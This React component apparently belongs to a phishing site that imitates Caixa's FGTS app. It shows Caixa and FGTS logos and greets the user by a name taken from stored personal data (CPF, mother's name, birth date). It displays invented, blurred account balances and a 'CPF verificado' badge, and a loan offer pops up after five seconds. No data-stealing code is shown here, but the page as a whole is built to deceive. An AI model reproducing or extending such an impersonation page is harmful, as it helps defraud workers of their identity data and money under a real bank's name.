
import React, { useEffect, useState } from 'react';
import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from '@/components/ui/button';

interface UserData {
  DADOS: {
    cpf: string;
    nome: string;
    nome_mae: string;
    data_nascimento: string;
    sexo: string;
  }
}

const Dashboard = () => {
  const [fullName, setFullName] = useState('');
  const [showPopup, setShowPopup] = useState(false);
  
  useEffect(() => {
    try {
      // Try to get user data from localStorage
      const userDataString = localStorage.getItem('userData');
      
      if (userDataString) {
        // If we have the full user data, use it
        const userData: UserData = JSON.parse(userDataString);
        setFullName(userData.DADOS.nome);
      } else {
        // Fallback to the previous approach if full data isn't available
        const cpf = localStorage.getItem('userCPF') || '';
        
        // Simulate API call to get user's full name based on CPF
        const simulateApiCall = async () => {
          try {
            // Simulate API delay
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Simulate getting a name based on the CPF
            const mockNames = [
              "Maria Silva", 
              "João Santos", 
              "Ana Oliveira", 
              "Pedro Souza", 
              "Carla Pereira"
            ];
            
            // Use last digit of CPF to select a name, or default if no CPF
            const nameIndex = cpf.length > 0 ? parseInt(cpf.slice(-1)) % mockNames.length : 0;
            setFullName(mockNames[nameIndex]);
          } catch (error) {
            console.error("Error fetching user data:", error);
            setFullName("Usuário");
          }
        };
        
        simulateApiCall();
      }
      
      // Set timeout for popup to appear after 5 seconds
      const popupTimer = setTimeout(() => {
        setShowPopup(true);
      }, 5000);
      
      return () => clearTimeout(popupTimer);
    } catch (error) {
      console.error("Error processing user data:", error);
      setFullName("Usuário");
    }
  }, []);

  // Function to blur text (style it to look unreadable)
  const BlurredText = ({ children, className = "" }: { children: React.ReactNode, className?: string }) => (
    <span className={`text-transparent bg-gray-300 rounded-sm blur-[1.5px] select-none ${className}`}>
      {children}
    </span>
  );

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      {/* Header */}
      <div className="p-6 flex justify-between items-center">
        <FGTSLogo className="h-10" />
        <CaixaLogo className="h-10" />
      </div>

      {/* Welcome */}
      <div className="p-6">
        <div className="text-white text-2xl font-light">Olá</div>
        <div className="text-white opacity-60 text-lg">{fullName}</div>
        <div className="text-white opacity-60 text-xs mt-1">CPF verificado</div>
      </div>

      {/* Main content */}
      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-6">
          {/* Meu FGTS */}
          <div className="mb-6">
            <h2 className="text-[#005CA9] text-2xl font-bold mb-2">Meu FGTS</h2>
            <div className="flex justify-between items-center">
              <div>
                <span className="text-gray-500">R$ </span>
                <BlurredText className="text-lg font-bold">5.900,00</BlurredText>
              </div>
              <ArrowRight className="text-[#FF8C00]" />
            </div>
            <div className="mt-1">
              <span className="text-[#FF8C00] text-sm">Ver todas suas contas (1)</span>
            </div>
          </div>

          {/* SALDO TOTAL */}
          <div className="bg-white border border-gray-200 rounded-lg p-4 mb-4 flex justify-between items-center shadow-sm">
            <div className="flex items-center">
              <div className="bg-[#FF8C00] w-12 h-12 rounded-full flex items-center justify-center mr-3">
                <BarChart3 className="text-white" />
              </div>
              <div>
                <span className="text-black font-bold">SALDO TOTAL</span>
                <span className="text-gray-500"> do FGTS</span>
              </div>
            </div>
            <ArrowRight className="text-[#FF8C00]" />
          </div>

          {/* Two column layout */}
          <div className="grid grid-cols-2 gap-4 mb-4">
            {/* Last deposit */}
            <div className="bg-gray-100 rounded-lg p-4">
              <div className="text-gray-500 text-sm">O último</div>
              <div className="text-gray-500 text-sm">depósito foi de</div>
              <div className="font-bold text-lg">
                R$ <BlurredText>189,89</BlurredText>
              </div>
              <div className="text-[#FF8C00] text-xs mt-2">referente a 07/11/2022</div>
            </div>

            {/* Saque Extraordinário */}
            <div className="bg-[#FFAB66] rounded-lg p-4 text-white relative">
              <div className="font-bold">Saque</div>
              <div className="font-bold">Extraordinário</div>
              <div className="text-sm mt-1">FGTS</div>
              <div className="absolute bottom-2 right-2">
                <div className="flex items-center">
                  <DollarSign className="h-5 w-5 mr-1" />
                  <ArrowRight className="h-5 w-5" />
                </div>
              </div>
            </div>
          </div>

          {/* Additional options */}
          <div className="grid grid-cols-2 gap-4">
            {/* Saque Aniversário */}
            <div className="bg-[#1E88E5] rounded-lg p-4 text-white relative">
              <div className="font-bold">Saque</div>
              <div className="font-bold">Aniversário</div>
              <div className="text-sm mt-1">do FGTS</div>
              <div className="absolute bottom-2 right-2">
                <ArrowRight className="h-5 w-5" />
              </div>
            </div>

            {/* Autorizar bancos */}
            <div className="bg-[#00ACC1] rounded-lg p-4 text-white relative">
              <div className="font-bold">Autorizar</div>
              <div className="text-sm">bancos</div>
              <div className="text-sm">a consultarem</div>
              <div className="text-sm">seu FGTS</div>
              <div className="absolute bottom-2 right-2">
                <ArrowRight className="h-5 w-5" />
              </div>
            </div>
          </div>
        </div>
        
        {/* Bottom Navigation */}
        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-[#FF8C00]">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>

      {/* Loan Popup */}
      <Dialog open={showPopup} onOpenChange={setShowPopup}>
        <DialogContent className="max-w-[350px] rounded-lg px-4 py-4 bg-white">
          <div className="flex flex-col items-start space-y-3">
            <span className="text-[#005CA9] text-2xl font-semibold">Crédito do Trabalhador</span>
            
            <div className="text-gray-600 text-sm mt-2">
              Faça simulações de empréstimo e solicite propostas de empréstimos para as instituições financeiras parceiras.
            </div>
            
            <Button 
              className="w-full mt-4 bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-2 rounded-full"
              onClick={() => setShowPopup(false)}
            >
              IR PARA EMPRÉSTIMOS
            </Button>
            
            <div className="w-full flex justify-center mt-2">
              <div className="w-2 h-2 rounded-full bg-[#005CA9]"></div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Dashboard;
